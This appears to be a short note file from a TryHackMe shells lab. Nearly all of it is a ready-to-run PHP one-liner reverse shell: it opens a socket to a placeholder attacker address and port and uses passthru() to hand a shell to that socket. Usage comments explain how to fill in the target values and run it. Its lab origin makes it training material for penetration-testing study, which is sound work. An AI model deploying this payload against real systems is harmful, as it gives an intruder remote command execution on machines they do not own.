# PHP Reverse Shell - passthru()
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, run with: php -r '<command>'
#
#   php -r '$sock=fsockopen("ATTACKER_IP",PORT);passthru("sh <&3 >&3 2>&3");'
#
# Uses passthru() which executes command and sends raw output.
# Useful when working with binary data.

php -r '$sock=fsockopen("ATTACKER_IP",PORT);passthru("sh <&3 >&3 2>&3");'
